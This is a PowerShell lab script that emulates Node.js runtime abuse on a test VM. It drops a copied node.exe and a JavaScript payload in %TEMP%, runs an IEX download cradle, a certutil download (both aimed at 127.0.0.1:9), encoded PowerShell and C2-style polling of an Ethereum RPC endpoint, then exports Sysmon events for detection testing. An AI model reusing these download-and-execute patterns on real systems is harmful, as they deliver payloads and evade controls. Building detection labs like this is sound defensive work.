<#
  mtdf_node_lab.ps1 - harmless emulation of Node.js runtime abuse, for MTDF detection testing.
  LAB VM ONLY. Self-contained: copy this one file to the VM and run it.

      powershell -ExecutionPolicy Bypass -File mtdf_node_lab.ps1

  What it does (about 9 minutes), and why it is safe:
    Loader   a COPY of the installed node.exe runs update.js from %TEMP%\mtdf-node, launched by
             PowerShell - the "runtime and payload dropped in a writable folder" pattern.
    Children whoami; a PowerShell IEX download cradle and a certutil download, both pointed at
             127.0.0.1:9 where nothing listens, so nothing is downloaded; encoded PowerShell that
             decodes to "whoami".
    C2       25 read-only eth_blockNumber calls to a public Ethereum RPC endpoint, ~20 s apart with
             25% jitter and a new connection each time - the polling shape of blockchain-resolved C2.
  Then it exports every Sysmon event from the run (process, network, file, DNS) to
  node_lab_capture.json next to this script, and removes %TEMP%\mtdf-node.

  Needs: Node.js (https://nodejs.org, LTS) and Sysmon logging Event IDs 1, 3, 11 and 22 for node.exe.
#>
$ErrorActionPreference = "Stop"

if (-not (Get-Service -Name Sysmon* -ErrorAction SilentlyContinue)) {
    Write-Host "Sysmon is not installed on this machine - install it first (see emulation/README.md)." -ForegroundColor Red; exit 1
}
$node = (Get-Command node -ErrorAction SilentlyContinue).Source
if (-not $node) { Write-Host "Node.js is not installed: https://nodejs.org (LTS), then open a new PowerShell." -ForegroundColor Red; exit 1 }

$start = (Get-Date).AddSeconds(-5)
$dir   = Join-Path $env:TEMP "mtdf-node"
New-Item -ItemType Directory -Force -Path $dir | Out-Null
Copy-Item $node (Join-Path $dir "node.exe") -Force

@'
// MTDF lab payload - harmless. See mtdf_node_lab.ps1.
const { exec } = require('child_process');
const https = require('https');
const run = (label, cmd) => new Promise(done => { console.log('starting:', label);
  try { exec(cmd, { timeout: 30000, windowsHide: true }, () => { console.log('   done:', label); done(); }); }
  catch (e) { console.log('   BLOCKED:', label, '(' + e.code + ' - antivirus or policy refused the process; carrying on)'); done(); } });
const sleep = ms => new Promise(r => setTimeout(r, ms));
const rpc = () => new Promise(done => {
  const body = JSON.stringify({ jsonrpc: '2.0', method: 'eth_blockNumber', params: [], id: 1 });
  const req = https.request({ host: 'ethereum-rpc.publicnode.com', port: 443, path: '/', method: 'POST', agent: false,
    headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) } },
    res => { res.resume(); res.on('end', done); res.on('error', done); });
  req.setTimeout(10000, () => req.destroy());     // never wait more than 10 s for an answer
  req.on('error', () => done()); req.on('close', () => done()); req.end(body);
});
(async () => {
  await run('1 benign whoami', 'whoami');
  await run('2 IEX cradle', `powershell -NoProfile -Command "IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1:9/test.ps1')"`);
  await run('3 encoded PowerShell', 'powershell -NoProfile -e dwBoAG8AYQBtAGkA');
  await run('4 certutil download', 'certutil -urlcache -f http://127.0.0.1:9/a.txt %TEMP%\\mtdf-node\\a.txt');
  for (let i = 1; i <= 25; i++) {
    await rpc(); console.log('rpc poll', i, 'of 25 (C2 polling - about 8 minutes in total)');
    await sleep(20000 * (0.75 + Math.random() * 0.5));
  }
})();
'@ | Set-Content -Path (Join-Path $dir "update.js") -Encoding utf8

Write-Host "Running the lab payload from $dir - about 9 minutes..." -ForegroundColor Cyan
& (Join-Path $dir "node.exe") (Join-Path $dir "update.js")
if ($LASTEXITCODE) { Write-Host "node exited with code $LASTEXITCODE - exporting what was captured anyway" -ForegroundColor Yellow }
Start-Sleep -Seconds 5

# ---- export Sysmon for the run window (same format as tools/Export-SysmonWindow.ps1) ----
$filter = @{ LogName = 'Microsoft-Windows-Sysmon/Operational'; StartTime = $start; EndTime = (Get-Date); Id = 1, 3, 11, 22 }
$rows = Get-WinEvent -FilterHashtable $filter -ErrorAction SilentlyContinue | ForEach-Object {
    $x = [xml]$_.ToXml(); $data = [ordered]@{}
    foreach ($e in $x.Event.EventData.Data) { $data[$e.Name] = $e.'#text' }
    [pscustomobject]@{ EventId = [int]$_.Id; TimeCreated = $_.TimeCreated.ToUniversalTime().ToString('o')
                       Computer = $_.MachineName; RecordId = $_.RecordId; EventData = $data }
}
$arr = @($rows)
$out = Join-Path $PSScriptRoot "node_lab_capture.json"
Set-Content -Path $out -Value $(if ($arr.Count) { ConvertTo-Json -InputObject $arr -Depth 8 } else { '[]' }) -Encoding utf8
Remove-Item $dir -Recurse -Force -ErrorAction SilentlyContinue

$nodeEv = @($arr | Where-Object { $_.EventData.Image -like '*mtdf-node*' -or $_.EventData.ParentImage -like '*mtdf-node*' })
$net    = @($nodeEv | Where-Object { $_.EventId -eq 3 })
Write-Host ("Exported {0} Sysmon events -> {1}" -f $arr.Count, $out) -ForegroundColor Green
Write-Host ("  from the lab node runtime: {0} events, of which {1} network connections" -f $nodeEv.Count, $net.Count)
if ($net.Count -lt 20) {
    Write-Host "  WARNING: fewer than 20 network events from node - your Sysmon config is probably not logging" -ForegroundColor Yellow
    Write-Host "  Event ID 3 for node.exe. See emulation/README.md, fix the config, and run this again." -ForegroundColor Yellow
}
